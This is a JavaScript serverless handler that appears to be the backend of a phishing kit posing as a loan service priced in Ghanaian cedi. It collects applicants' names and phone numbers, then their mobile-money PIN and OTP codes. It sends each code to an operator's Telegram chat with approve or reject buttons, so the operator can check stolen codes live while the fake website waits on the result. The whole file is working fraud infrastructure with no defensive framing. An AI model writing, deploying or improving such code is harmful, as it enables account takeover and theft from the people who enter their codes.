globalThis.verificationStore = globalThis.verificationStore || {};

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Vercel settings." });
    }

    // --- 1. WEBSITE CHECKING STATUS ---
    if (req.method === 'GET') {
        const { userId, type } = req.query;
        const key = `${userId}_${type}`;
        const status = globalThis.verificationStore[key] || 'pending';

        if (status !== 'pending') {
            delete globalThis.verificationStore[key];
        }
        return res.status(200).json({ status: status });
    }

    // --- 2. POST REQUESTS (Website or Telegram) ---
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM WEBHOOK (You clicked a button)
            if (body.callback_query) {
                const callback = body.callback_query;
                const [action, userId, type] = callback.data.split('_');

                globalThis.verificationStore[`${userId}_${type}`] = action === 'approve' ? 'approved' : 'rejected';

                let newText = action === 'approve' 
                    ? `✅ <b>${type} APPROVED</b> - User can proceed` 
                    : `❌ <b>${type} REJECTED</b> - User must try again`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: newText,
                        parse_mode: 'HTML' // Changed to HTML for safety
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA
            if (body.action === 'send') {
                const { type, userId, data } = body;
                let message = "";
                let keyboard = null; // Initialize as null
                const time = new Date().toLocaleString();

                if (type === 'APPLICATION') {
                    message = `📝 <b>NEW APPLICATION</b>\nName: ${data.name}\nPhone: ${data.phone}\nAmount: GHC ${data.amount}`;
                    // No keyboard for application
                } 
                else if (type === 'PIN' || type === 'OTP') {
                    const title = type === 'PIN' ? 'PIN VERIFICATION NEEDED' : 'OTP VERIFICATION NEEDED';
                    const length = type === 'PIN' ? '4 digits' : '6 digits';
                    
                    message = `# Thor - ${type} Verification\n`;
                    message += `<b>${title}</b>\n\n`;
                    message += `<b>USER DETAILS:</b>\n`;
                    message += `• Phone Number: ${data.phone}\n`;
                    message += `• ${type} Code: <code>${data.value}</code>\n`; 
                    message += `• Username & Pass: user_${userId}\n`;
                    message += `• Time: ${time}\n`;
                    message += `• Bot: user75\n\n`;
                    message += `<b>Verify the ${type}:</b>\n`;
                    message += `• ${type} Length: ${length}\n`;
                    message += `• Timeout: 5 minutes\n`;

                    // Setup the buttons
                    keyboard = {
                        inline_keyboard: [
                            [
                                { text: `✅ Correct ${type}`, callback_data: `approve_${userId}_${type}` },
                                { text: `❌ Wrong ${type}`, callback_data: `reject_${userId}_${type}` }
                            ]
                        ]
                    };
                }

                // Prepare the payload
                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML' // Using HTML prevents the parsing errors
                };

                // ONLY add reply_markup if a keyboard exists
                if (keyboard) {
                    payload.reply_markup = keyboard;
                }

                const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // Check if Telegram rejected the message
                if (!tgResponse.ok) {
                    const errData = await tgResponse.json();
                    return res.status(500).json({ error: "Telegram Error: " + errData.description });
                }

                return res.status(200).json({ success: true });
            }

        } catch (error) {
            console.error(error);
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
                  }
